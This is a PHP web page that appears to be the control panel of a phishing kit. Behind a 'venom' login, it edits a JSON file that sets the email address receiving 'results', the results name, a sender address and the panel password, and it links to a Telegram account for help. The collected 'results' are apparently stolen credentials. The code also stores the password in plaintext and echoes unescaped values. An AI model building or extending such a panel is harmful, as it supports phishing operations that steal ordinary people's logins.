<?php
session_start();
if (!isset($_SESSION['username'])) {
    header('Location:venomlogin.php');
    die;
} else {
    $username = $_SESSION['username'];
}
$file = 'venom/noob/here/yesme.json';
$jsonString = file_get_contents('venom/noob/here/yesme.json');
$data = json_decode($jsonString);
$content = json_decode($jsonString, true);

$email = $data->email;
$name = $data->name;
$sender = $data->sender;
$pass = $data->password;

if(isset($_POST['nameUpdate'])){
    $newName = $_POST['newName'];
    $content['name'] = $newName;
    $updatedJsonData = json_encode($content);
    file_put_contents($file , $updatedJsonData);
    header('Location:data.php');
}

if(isset($_POST['emailUpdate'])){
    $newMail = $_POST['newEmail'];
    $content['email'] = $newMail;
    $updatedJsonData = json_encode($content);
    file_put_contents($file , $updatedJsonData);
    header('Location:data.php');
}

if(isset($_POST['senderUpdate'])){
    $newSenderMail = $_POST['newSender'];
    $content['sender'] = $newSenderMail;
    $updatedJsonData = json_encode($content);
    file_put_contents($file , $updatedJsonData);
    header('Location:data.php');
}

if(isset($_POST['passUpdate'])){
    $newPass = $_POST['newPass'];
    $content['password'] = $newPass;
    $updatedJsonData = json_encode($content);
    file_put_contents($file , $updatedJsonData);
    header('Location:data.php');
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WEB LOGIN</title>
    <link rel="stylesheet" href="styles/data.css">
    <style>
        label {
            display: block;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header"><img src="styles/noiisy.jpg" alt=""></div>
        <div class="login-box">
            <div class="heading">
                <h2>WEB PANEL</h2>
            </div>
            <div class="form">
                <div class="inputs">
                    <div id="old">
                    <label for="currentMail" style="display: block;">
                        <p>Current Email Address</p>
                    </label>
                    <input type="text" class="input" name="currentMail" readonly value="<?php echo $email ?>"><br><br>
                    <label for="currentMail" style="display: block;">
                        <p>Current Results Name</p>
                    </label>
                    <input type="text" class="input" name="currentMail" readonly value="<?php echo $name ?>"><br><br>
                    <!-- <label for="currentMail" style="display: block;">
                        <p>Current Sender Mail</p>
                    </label>
                    <input type="text" class="input" name="currentMail" readonly value="<?php echo $sender ?>"><br><br> -->
                    
                    </div>
                    <form method="post">
                        <div class="change-box-email">
                            <div id="emailUpdate" style="display: none;">
                                <input type="text" name="newEmail" required class="input" placeholder="Enter New Email Address"><br>
                                <button name = "emailUpdate" class="btn-change" type="submit" style="max-width: 100%;position: relative;left: 50%;transform: translate(-50%, 4px);">UPDATE</button><br><br>
                            </div>
                        </form>
                        <form method="post">
                            <div id="nameUpdate" style="display: none;">
                                <input type="text" name="newName" required class="input" placeholder="Enter New Results Name"><br>
                                <button name="nameUpdate" class="btn-change" type="submit" style="max-width: 100%;position: relative;left: 50%;transform: translate(-50%, 4px);">UPDATE</button><br><br>
                            </div>
                        </form>
                        <form method="post">
                            <div id="senderUpdate" style="display: none;">
                                <input type="text" name="newSender" required class="input" placeholder="Enter New Sender Mail"><br>
                                <button name="senderUpdate" class="btn-change" type="submit" style="max-width: 100%;position: relative;left: 50%;transform: translate(-50%, 4px);">UPDATE</button><br><br>
                            </div>
                        </form>
                        <form method="post">
                            <div id="passUpdate" style="display: none;">
                                <input type="text" name="newPass" required class="input" placeholder="Enter New Password"><br>
                                <button name="passUpdate" class="btn-change" type="submit" style="max-width: 100%;position: relative;left: 50%;transform: translate(-50%, 4px);">UPDATE</button><br><br>
                            </div>
                        </form>
                        </div>
                    <button class="btn-change" onclick="changeEmail()">Change Data Mail</button>
                    <button class="btn-change" onclick="changeName()">Change Result Name</button><br><br>
                   
                    <button class="btn-change" onclick="changePass()" style="position: relative;
    left: 50%;
    transform: translate(-50%, 0);margin:4px 0">Change Panel Passsword</button>
                </div>
            </div>
            <div class="help">
            <p>Need Help? <a href="https://t.me/info_aimbot">CONTACT</a></p>
            </div>
        </div>
    </div>
</body>

</html>

<script>
    emailChange = document.getElementById('emailUpdate');
    nameChange = document.getElementById('nameUpdate');
    senderChange = document.getElementById('senderUpdate');
    old = document.getElementById('old');
    password = document.getElementById('passUpdate');

    
    function changeEmail(){
        emailChange.style.display = "block";
        old.style.display = "none";
        senderChange.style.display = "none";
        nameChange.style.display = "none";
        password.style.display = "none";
    }
    function changeName(){
        emailChange.style.display = "none";
        old.style.display = "none";
        nameChange.style.display = "block";
        senderChange.style.display = "none";
        password.style.display = "none";
    }
    function changeSender(){
        emailChange.style.display = "none";
        old.style.display = "none";
        nameChange.style.display = "none";
        senderChange.style.display = "block";
        password.style.display = "none";
    }
    function changePass(){
        emailChange.style.display = "none";
        old.style.display = "none";
        nameChange.style.display = "none";
        senderChange.style.display = "none";
        password.style.display = "block";
    }
</script>